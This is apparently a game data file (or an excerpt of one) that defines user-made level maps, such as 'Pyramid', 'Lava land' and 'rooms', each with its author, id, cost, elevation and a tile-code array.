ector(98,102,139),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(199,200,214),Vector(199,200,214),0,0,Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(65,64,96),Vector(65,64,96),Vector(98,102,139),Vector(232,204,203),Vector(232,204,203),Vector(8,26,55),Vector(179,216,243),Vector(243,237,240),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(199,200,214),Vector(199,200,214),0,Vector(98,102,139),Vector(98,102,139),Vector(241,237,245),Vector(98,102,139),Vector(65,64,96),Vector(98,102,139),Vector(98,102,139),Vector(232,204,203),Vector(232,204,203),Vector(8,26,55),Vector(179,216,243),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(232,204,203),Vector(232,204,203),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(98,102,139),Vector(93,98,129),Vector(99,103,141),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(98,102,139),Vector(232,204,203),Vector(232,204,203),Vector(98,102,139),Vector(98,102,139),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),0,0,Vector(98,102,139),Vector(96,101,140),Vector(101,106,153),0,Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(8,26,55),Vector(8,26,55),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),0,0,0,Vector(106,112,147),Vector(100,105,152),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(98,102,139),0,0,0,Vector(98,103,143),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(98,102,139),0,0,Vector(98,102,139)]});
maps.push({name="TheShy",author="TheShy",id="#1682260835",direction="forward",cost=484,elevation=10,map=[14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,2,2,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,144,144,0,144,144,144,144,144,144,0,0,0,0,0,14,14,0,0,0,0,144,144,0,0,0,0,0,144,144,0,0,0,0,0,14,14,0,0,0,0,144,144,0,144,144,144,144,144,144,0,0,0,0,0,14,14,0,0,0,0,144,144,0,0,0,0,0,144,144,0,0,0,0,0,14,14,0,0,0,0,144,144,144,144,0,144,144,144,144,0,0,0,0,0,14,14,0,0,0,0,144,144,0,0,0,0,0,144,144,0,0,0,0,0,14,14,0,0,0,0,144,144,0,144,0,144,0,144,144,0,0,0,0,0,14,14,0,0,0,0,144,144,0,144,0,144,0,144,144,0,0,0,0,0,14,14,0,0,0,0,144,144,0,0,0,144,0,144,144,0,0,0,0,0,14,14,0,0,0,0,144,144,0,144,0,144,0,144,144,0,0,0,0,0,14,14,0,0,0,0,144,144,0,144,0,0,0,144,144,0,0,0,0,0,14,14,0,0,0,0,144,144,0,0,0,0,0,144,144,0,0,0,0,0,14,14,0,0,0,0,144,144,144,144,0,144,144,144,144,0,0,0,0,0,14,14,0,0,0,0,144,144,0,0,0,0,0,144,144,0,0,0,0,0,14,14,0,0,0,0,144,144,144,144,0,0,0,144,144,0,0,0,0,0,14,14,0,0,0,0,144,144,0,0,144,144,144,144,144,0,0,0,0,0,14,14,14,14,14,14,14,14,15,16,17,18,19,20,21,22,23,24,24,24,14,14,14,14,14,14,14,14,15,16,17,18,19,20,21,22,23,24,2,2]});
maps.push({name="Kan Kan Shui Tie Men",author="TheShy",id="#1682337452",direction="forward",cost=545,elevation=15,map=[199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,2,2,199,199,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,86,199,199,22,86,86,86,86,86,86,86,86,86,86,86,86,86,86,86,86,0,199,199,23,86,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,24,86,86,86,86,86,86,86,86,86,86,86,86,86,86,86,86,0,199,199,23,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,86,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,6,86,199,199,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,86,199,199,22,86,86,86,86,86,86,86,86,86,86,86,86,86,86,86,86,0,199,199,23,86,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,24,86,86,86,86,86,86,86,86,86,86,86,86,86,86,86,86,0,199,199,23,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,86,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,6,86,199,199,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,86,199,199,22,86,86,86,86,86,86,86,86,86,86,86,86,86,86,86,86,0,199,199,23,86,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,24,86,86,86,86,86,86,86,86,86,86,86,86,86,86,86,86,0,199,199,23,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,86,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,6,86,199,2,2,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,86,199]});
maps.push({name="elevator",author="elevator",id="#1682498912",direction="left",cost=178,elevation=19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,93,94,25,2,2,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,9,9,9,25,25,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,92,25,95,25,25,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,25,25,95,25,25,0,0,0,0,0,0,0,0,0,0,0,0,10,92,10,25,25,95,25,25,25,25,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,25,25,25,25,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,18,18,0,0,0,0,2,24,24,24,92,21,95,21,21,21,21,21,20,20,18,18,0,0,0,0,2,24,24,24,0,21,95,21,21,21,21,92,18,18,18,18,0,0,0,0,0,0,0,0,0,89,100,18,18,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,89,18,18,18,18,18,18,18,18,18,18,0,0,0,0]});
maps.push({name="Pyramid",author="TheShy",id="#1682687746",direction="forward",cost=400,elevation=0,map=[5,5,5,5,5,5,5,5,5,2,2,5,5,5,5,5,5,5,5,5,5,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,5,5,6,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,6,5,5,6,7,8,8,8,8,8,8,8,8,8,8,8,8,8,8,7,6,5,5,6,7,8,9,9,9,9,9,9,9,9,9,9,9,9,8,7,6,5,5,6,7,8,9,10,10,10,10,10,10,10,10,10,10,9,8,7,6,5,5,6,7,8,9,10,11,11,11,11,11,11,11,11,10,9,8,7,6,5,5,6,7,8,9,10,11,12,12,12,12,12,12,11,10,9,8,7,6,5,5,6,7,8,9,10,11,12,13,13,13,13,12,11,10,9,8,7,6,5,5,6,7,8,9,10,11,12,13,93,93,13,12,11,10,9,8,7,6,5,5,6,7,8,9,10,11,12,13,93,93,13,12,11,10,9,8,7,6,5,5,6,7,8,9,10,11,12,13,13,13,13,12,11,10,9,8,7,6,5,5,6,7,8,9,10,11,12,12,12,12,12,12,11,10,9,8,7,6,5,5,6,7,8,9,10,11,11,11,11,11,11,11,11,10,9,8,7,6,5,5,6,7,8,9,10,10,10,10,10,10,10,10,10,10,9,8,7,6,5,5,6,7,8,9,9,9,9,9,9,9,9,9,9,9,9,8,7,6,5,5,6,7,8,8,8,8,8,8,8,8,8,8,8,8,8,8,7,6,5,5,6,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,6,5,5,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,5,5,5,5,5,5,5,5,5,5,2,2,5,5,5,5,5,5,5,5,5]});
maps.push({name="LBW field",author="TheShy",id="#1682746403",direction="forward",cost=220,elevation=0,map=[2,2,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,93,93,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,93,93,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,94,94,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,94,94,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,100,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,100,2,2,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Find the way",author="Luffaren",id="#1682946780",direction="right",cost=281,elevation=4,map=[0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,18,90,14,14,14,0,0,0,0,0,0,0,0,0,0,18,18,94,18,94,18,14,14,14,14,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,18,90,14,14,14,0,0,0,0,0,0,0,0,0,0,18,18,17,16,15,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,18,18,17,16,15,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,90,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,118,118,118,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,118,118,89,118,1,0,0,0,0,0,0,0,0,0,0,0,145,38,145,1,118,118,118,118,1,0,0,0,0,0,0,0,0,0,0,0,38,100,38,1,90,118,118,118,1,1,1,1,1,1,1,1,1,1,1,1,1,118,1,1,1,1,95,1,1,118,93,118,118,118,118,89,118,118,118,90,1,118,1,1,90,118,118,118,1,118,118,118,118,118,118,118,118,118,118,118,1,95,1,1,118,118,118,118,1,1,1,1,1,95,1,1,1,1,95,95,1,118,2,1,90,118,89,118,1,90,118,118,118,118,90,1,118,118,118,118,118,118,2,1,118,118,118,118,95,118,118,89,118,118,118,1,93,118,118,89,118,118,1,1,90,118,118,118,1,90,118,118,118,118,90,1,118,118,118,118,118,90,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Lava land",author="Luffaren",id="#1682947020",direction="forward",cost=386,elevation=0,map=[0,0,5,5,2,2,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,7,5,5,5,5,5,7,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,94,5,5,7,7,7,0,0,0,0,0,0,0,0,0,0,0,77,75,5,5,5,89,5,7,7,0,0,0,0,0,0,0,0,0,0,0,77,75,75,75,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,75,5,75,77,0,0,0,0,0,0,0,0,0,0,0,0,5,5,7,5,75,75,75,75,77,0,0,0,0,0,0,0,0,0,0,0,7,5,5,75,75,75,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,75,75,75,5,5,89,5,5,77,0,0,0,0,0,0,0,0,0,77,75,75,75,75,75,5,5,5,5,75,77,0,0,0,0,0,0,0,0,77,75,75,75,5,75,75,5,5,75,75,75,77,0,0,0,0,0,0,0,77,75,75,5,5,5,75,75,75,75,5,5,5,0,0,0,0,0,0,0,0,5,5,5,5,5,5,75,5,5,5,89,5,0,0,0,0,0,0,0,0,77,75,75,75,5,75,75,75,75,5,5,5,5,77,0,0,0,0,0,0,0,5,5,75,75,75,5,5,75,75,75,75,75,75,77,0,0,0,0,0,0,0,5,75,75,5,5,5,5,5,75,5,5,5,5,0,0,0,0,0,0,77,75,75,5,7,7,93,5,5,75,5,5,5,7,0,0,0,0,0,0,0,77,5,5,5,5,5,5,75,75,5,89,5,5,7,0,0,0,0,0,0,0,0,77,75,75,75,75,75,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,77,75,5,5,5,5,5,2,2,5,5,0]});
maps.push({name="Grand path",author="Luffaren",id="#1682947380",direction="right",cost=200,elevation=0,map=[1,34,2,2,34,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,14,14,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,14,14,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,14,14,34,0,0,0,0,67,67,0,189,39,38,37,36,0,0,67,1,34,14,14,34,1,0,0,0,1,1,0,39,100,1,1,35,0,0,1,0,34,14,14,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,0,34,14,14,90,14,90,14,90,14,90,14,90,14,90,14,90,14,89,14,0,34,14,14,14,14,14,14,14,14,14,89,14,14,14,14,14,14,14,2,0,34,14,14,14,14,14,89,14,14,14,14,14,14,14,14,14,14,14,2,0,34,14,14,90,14,90,14,90,14,90,14,90,14,90,14,90,14,89,14,1,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,1,1,0,0,0,1,0,0,0,1,1,0,39,100,1,1,35,0,0,1,0,0,0,0,0,0,0,0,0,67,67,0,188,39,38,37,36,0,0,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Jump jump jump",author="Luffaren",id="#1682948280",direction="right",cost=232,elevation=0,map=[2,2,14,94,94,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,94,94,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,127,127,127,127,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,67,67,67,67,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,65,65,65,65,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,65,65,65,65,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,65,65,65,65,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,1,0,0,0,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,129,0,0,0,0,67,65,65,65,65,14,89,14,93,93,14,14,14,14,14,129,0,0,0,0,67,65,65,65,65,14,14,14,93,93,14,14,89,14,14,129,0,0,0,0,67,65,65,65,65,14,14,14,14,14,14,14,14,14,14,129,0,0,0,0,67,65,65,65,65,14,14,89,14,2,14,89,14,14,14,129,0,0,0,0,67,65,65,65,65,14,14,14,14,2,14,14,14,14,14,14,1,0,0,0,1,14,14,14,14,14,14,14,14,14]});
maps.push({name="Sliding",author="Luffaren",id="#1682954100",direction="left",cost=956,elevation=0,map=[199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,2,2,199,2,14,14,14,199,160,160,161,161,161,199,160,160,161,161,161,199,160,160,199,2,14,14,14,199,160,161,161,159,161,199,160,161,161,159,161,199,160,160,199,14,14,14,14,199,160,160,199,159,159,199,160,160,199,159,159,199,160,160,199,14,93,94,14,199,160,160,199,159,159,199,160,160,199,159,159,199,160,160,199,14,14,14,14,199,160,160,199,159,159,199,160,160,199,159,159,199,160,160,199,14,93,94,14,199,160,160,199,159,159,199,160,160,199,159,159,199,160,160,199,14,14,14,14,199,160,160,199,159,159,199,160,160,199,159,159,199,160,160,199,14,14,14,14,199,160,160,199,159,159,199,160,160,199,159,159,199,160,160,199,199,199,159,159,199,160,160,199,159,159,199,160,160,199,159,159,199,160,160,199,0,199,159,159,199,160,160,199,159,159,199,160,160,199,159,159,199,160,160,199,0,199,159,159,199,160,160,199,159,159,199,160,160,199,159,159,199,160,160,199,0,199,159,159,199,160,160,199,159,159,199,160,160,199,159,159,199,160,160,199,0,199,159,159,199,160,160,199,159,159,199,160,160,199,159,159,199,160,160,199,0,199,159,159,199,160,160,199,159,159,199,160,160,199,159,159,199,160,160,199,0,199,159,159,199,160,160,199,159,159,199,160,160,199,159,159,199,160,160,199,0,199,159,159,199,160,160,199,159,159,199,160,160,199,159,159,199,160,160,199,0,199,159,161,161,160,161,199,159,161,161,160,161,199,159,161,161,160,161,199,0,199,159,159,161,161,161,199,159,159,161,161,161,199,159,159,161,161,161,199,0,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199]});
maps.push({name="Zigzag",author="Luffaren",id="#1682956262",direction="forward",cost=264,elevation=0,map=[0,0,0,0,0,0,0,9,9,2,2,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,67,161,161,161,161,161,161,67,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,67,162,162,162,162,162,162,67,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,67,161,161,161,161,161,161,67,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,67,162,162,162,162,162,162,67,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,67,161,161,161,161,161,161,67,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,67,162,162,162,162,162,162,67,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,67,161,161,161,161,161,161,67,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,67,162,162,162,162,162,162,67,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,2,2,9,9,0,0,0,0,0,0,0]});
maps.push({name="Ups and downs",author="Luffaren",id="#1683003364",direction="forward",cost=216,elevation=0,map=[0,0,0,0,0,0,0,94,14,2,2,14,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,13,13,13,13,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,12,12,12,12,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,11,11,11,11,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,10,10,10,10,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,9,9,9,9,19,0,0,0,0,0,0,0,44,145,0,0,0,0,0,20,8,8,8,8,20,0,0,0,0,0,145,44,93,44,0,0,0,0,0,21,7,7,7,7,21,0,0,0,0,0,44,93,24,44,44,44,44,43,22,22,6,6,6,6,22,22,43,44,44,44,44,24,24,44,44,44,44,43,22,22,6,6,6,6,22,22,43,44,44,44,44,24,100,44,0,0,0,0,0,21,7,7,7,7,21,0,0,0,0,0,44,100,44,145,0,0,0,0,0,20,8,8,8,8,20,0,0,0,0,0,145,44,0,0,0,0,0,0,0,19,9,9,9,9,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,10,10,10,10,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,11,11,11,11,17,0,0,0,0,0,0,0,67,67,67,0,0,0,0,16,12,12,12,12,16,0,0,0,0,67,67,67,1,1,1,67,0,0,0,15,13,13,13,13,15,0,0,0,67,1,1,1,1,1,1,67,0,0,0,14,14,14,14,14,14,0,0,0,67,1,1,1,1,1,1,67,0,0,0,89,14,2,2,14,89,0,0,0,67,1,1,1]});
maps.push({name="Close yet far",author="Luffaren",id="#1683207426",direction="left",cost=158,elevation=0,map=[1,1,1,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,2,114,114,199,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,2,114,114,199,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,199,114,94,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,93,114,199,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,199,114,94,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,93,114,199,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,199,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,199,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,199,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,199,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,199,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,199,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,199,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,199,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,199,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,199,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,114,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,114,114,114,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Ranger",author="IV",id="#1683660487",direction="left",cost=419,elevation=-15,map=[0,0,0,0,67,67,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,67,100,67,0,0,0,0,0,0,0,0,0,67,20,67,0,0,0,0,0,67,14,15,67,0,0,0,0,0,0,0,67,20,20,67,0,0,0,0,0,67,14,15,16,67,0,0,0,0,0,67,20,20,67,0,0,0,0,0,0,67,14,70,16,17,67,0,0,0,67,20,20,67,0,0,0,0,0,0,0,67,14,70,70,17,18,67,0,67,20,20,67,0,0,0,0,0,0,0,0,67,14,70,93,70,18,19,67,20,20,67,0,0,0,0,0,0,0,0,0,67,14,70,94,93,70,19,20,20,67,0,0,0,0,0,0,0,67,67,67,85,14,70,70,70,70,19,20,85,67,67,67,67,67,67,0,2,65,5,14,14,14,15,16,17,18,19,20,20,183,146,146,146,183,146,67,2,65,5,14,14,14,15,16,17,18,19,20,20,146,146,183,146,146,146,100,0,67,67,67,85,14,70,70,70,70,19,20,85,67,67,67,67,67,67,0,0,0,0,0,67,14,70,94,93,70,19,20,20,67,0,0,0,0,0,0,0,0,0,0,67,14,70,93,70,18,19,67,148,148,67,0,0,0,0,0,0,0,0,0,67,14,70,70,17,18,67,0,67,146,146,67,0,0,0,0,0,0,0,0,67,14,70,16,17,67,0,0,0,67,148,148,67,0,0,0,0,0,0,0,67,14,15,16,67,0,0,0,0,0,67,146,148,67,0,0,0,0,0,0,67,14,15,67,0,0,0,0,0,0,0,67,146,148,67,0,0,0,0,0,67,100,67,0,0,0,0,0,0,0,0,0,67,100,67,0,0,0,0,0,67,67,0,0,0,0,0,0,0,0,0,0,0,67,67,0]});
maps.push({name="hi",author="alli",id="#1683950007",direction="forward",cost=456,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,90,105,105,1,0,1,160,160,160,158,161,161,161,161,158,161,161,161,161,105,105,105,105,1,0,1,160,160,160,158,161,161,161,161,158,161,161,161,161,105,105,105,105,1,0,1,160,160,160,158,161,161,161,161,158,161,161,161,161,105,105,105,105,1,0,1,158,158,158,1,1,199,199,199,199,199,199,199,1,1,90,105,105,1,0,1,160,160,160,1,0,105,105,105,105,105,105,105,0,1,105,105,105,1,0,1,160,160,160,199,105,145,145,145,145,145,145,145,0,199,105,105,105,1,0,1,160,160,160,199,105,145,0,0,0,0,0,0,0,199,105,105,105,1,0,1,160,160,160,199,105,145,0,0,153,0,0,0,0,199,105,105,105,1,0,1,158,158,158,199,105,145,0,0,13,186,0,0,0,199,105,105,105,1,0,1,160,160,160,199,105,145,0,0,154,0,0,0,0,199,90,105,105,1,0,1,160,160,160,199,105,145,0,0,157,0,0,0,0,199,105,105,105,1,0,1,160,160,160,199,105,145,0,0,0,0,0,0,0,199,105,105,105,1,0,1,158,158,158,199,105,145,0,0,0,0,0,0,0,199,105,105,105,1,0,1,160,160,160,199,105,145,0,0,0,0,0,0,0,1,105,105,105,1,0,1,160,160,160,1,0,0,5,5,5,0,0,0,0,1,90,105,105,1,0,1,5,5,5,5,1,0,5,100,5,0,0,5,0,105,105,105,105,1,0,1,93,93,93,131,1,0,5,132,5,0,0,5,0,105,105,105,105,1,0,0,1,1,1,1,0,0,5,5,5,0,0,0,0,1,1,2,2,1,0]});
maps.push({name="rooms",author="IV",id="#1684540958",direction="forward",cost=529,elevation=0,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,137,90,125,1,134,76,94,1,132,90,76,1,131,107,90,1,107,107,1,1,107,107,107,1,107,76,76,1,107,76,107,1,107,107,107,95,107,107,1,1,93,89,138,1,90,107,136,1,76,94,133,1,107,107,107,1,107,107,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,96,1,1,107,107,1,1,137,90,107,1,134,107,107,1,132,94,89,1,131,107,107,1,107,90,1,1,107,149,107,1,107,107,80,1,90,107,107,1,107,107,107,95,107,107,1,1,107,107,138,1,89,90,136,1,107,89,133,1,90,107,107,1,107,107,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,96,1,1,90,107,1,1,137,65,94,1,134,107,85,1,132,86,93,1,131,107,90,1,107,107,1,1,107,65,107,1,107,107,107,1,107,107,107,1,107,107,107,95,107,107,1,1,65,107,138,1,85,107,136,1,144,107,133,1,107,107,107,1,107,90,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,96,1,1,107,107,1,1,137,107,93,1,134,107,107,1,132,72,107,1,131,107,107,1,107,90,1,1,107,76,107,1,107,107,107,1,74,76,107,1,107,107,107,95,107,107,1,1,76,107,138,1,93,94,136,1,107,107,133,1,90,107,107,1,90,107,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,96,1,1,107,107,1,1,97,107,139,1,134,107,136,1,132,107,133,1,131,107,90,1,107,107,1,1,107,107,107,96,107,107,107,96,107,107,107,96,107,107,107,95,107,107,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
